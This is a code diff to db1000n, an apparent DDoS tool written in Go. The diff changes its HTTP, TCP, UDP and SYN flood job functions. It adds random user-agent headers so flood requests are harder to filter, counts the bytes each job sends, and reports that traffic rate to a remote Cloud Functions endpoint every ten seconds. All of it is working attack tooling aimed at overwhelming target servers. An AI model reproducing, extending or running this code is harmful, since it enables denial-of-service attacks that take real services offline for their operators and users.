@@ -18,12 +18,13 @@ import (
 	"strings"
 	"time"
 
+	"github.com/corpix/uarand"
 	"github.com/google/uuid"
 
-	"db1000n/slowloris"
+	"github.com/Arriven/db1000n/logs"
+	"github.com/Arriven/db1000n/metrics"
 	"github.com/Arriven/db1000n/synfloodraw"
-
-	"db1000n/logs"
+	"github.com/Arriven/db1000n/slowloris"
 )
 
 // JobArgs comment for linter
@@ -118,15 +119,24 @@ func httpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 	if err != nil {
 		return err
 	}
+	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
 	for jobConfig.Next(ctx) {
 		req, err := http.NewRequest(parseStringTemplate(jobConfig.Method), parseStringTemplate(jobConfig.Path), bytes.NewReader(parseByteTemplate(jobConfig.Body)))
 		if err != nil {
 			l.Debug("error creating request: %v", err)
 			continue
 		}
+
+		// Add random user agent
+		req.Header.Set("user-agent", uarand.GetRandom())
 		for key, value := range jobConfig.Headers {
+			trafficMonitor.Add(len(key))
+			trafficMonitor.Add(len(value))
 			req.Header.Add(parseStringTemplate(key), parseStringTemplate(value))
 		}
+		trafficMonitor.Add(len(jobConfig.Method))
+		trafficMonitor.Add(len(jobConfig.Path))
+		trafficMonitor.Add(len(jobConfig.Body))
 
 		startedAt := time.Now().Unix()
 		l.Debug("%s %s started at %d", jobConfig.Method, jobConfig.Path, startedAt)
@@ -165,12 +175,12 @@ func tcpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 	if err != nil {
 		return err
 	}
+	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
 	tcpAddr, err := net.ResolveTCPAddr("tcp", parseStringTemplate(jobConfig.Address))
 	if err != nil {
 		return err
 	}
 	for jobConfig.Next(ctx) {
-
 		startedAt := time.Now().Unix()
 		l.Debug("%s started at %d", jobConfig.Address, startedAt)
 
@@ -181,6 +191,7 @@ func tcpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 		}
 
 		_, err = conn.Write(parseByteTemplate(jobConfig.Body))
+		trafficMonitor.Add(len(jobConfig.Body))
 
 		finishedAt := time.Now().Unix()
 		if err != nil {
@@ -202,6 +213,7 @@ func udpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 	if err != nil {
 		return err
 	}
+	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
 	udpAddr, err := net.ResolveUDPAddr("udp", parseStringTemplate(jobConfig.Address))
 	if err != nil {
 		return err
@@ -216,6 +228,7 @@ func udpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 
 	for jobConfig.Next(ctx) {
 		_, err = conn.Write(parseByteTemplate(jobConfig.Body))
+		trafficMonitor.Add(len(jobConfig.Body))
 
 		finishedAt := time.Now().Unix()
 		if err != nil {
@@ -247,7 +260,7 @@ func synFloodJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
 		<-ctx.Done()
 		shouldStop <- true
 	}()
-	l.Debug("sending syn flood with params:", jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
+	l.Debug("sending syn flood with params: Host %v, Port %v , PayloadLength %v, FloodType %v", jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
 	return synfloodraw.StartFlooding(shouldStop, jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
 }
 
@@ -325,8 +338,34 @@ func fetchConfig(configPath string) (*Config, error) {
 	return &config, nil
 }
 
-func main() {
+func dumpMetrics(l *logs.Logger, name, clientID string) {
+	bytesPerSecond := metrics.Default.Read(name)
+	l.Info("The app is generating %v bytes per second", bytesPerSecond)
+	type metricsDump struct {
+		BytesPerSecond int `json:"bytes_per_second"`
+	}
+	dump := &metricsDump{
+		BytesPerSecond: bytesPerSecond,
+	}
+	dumpBytes, err := json.Marshal(dump)
+	if err != nil {
+		l.Warning("failed marshaling metrics: %v", err)
+		return
+	}
+	// TODO: use proper ip
+	url := fmt.Sprintf("https://us-central1-db1000n-metrics.cloudfunctions.net/addTrafic?id=%s", clientID)
+	resp, err := http.Post(url, "application/json", bytes.NewReader(dumpBytes))
+	if err != nil {
+		l.Warning("failed sending metrics: %v", err)
+		return
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusAccepted {
+		l.Warning("bad response when sending metrics. code %v", resp.StatusCode)
+	}
+}
 
+func main() {
 	var configPath string
 	var refreshTimeout time.Duration
 	var logLevel logs.Level
@@ -335,6 +374,13 @@ func main() {
 	flag.IntVar(&logLevel, "l", logs.Info, "logging level. 0 - Debug, 1 - Info, 2 - Warning, 3 - Error. Default is Info")
 	flag.Parse()
 	l := logs.Logger{Level: logLevel}
+	clientID := uuid.New().String()
+	go func() {
+		for {
+			time.Sleep(10 * time.Second)
+			dumpMetrics(&l, "traffic", clientID)
+		}
+	}()
 	var cancel context.CancelFunc
 	defer func() {
 		cancel()
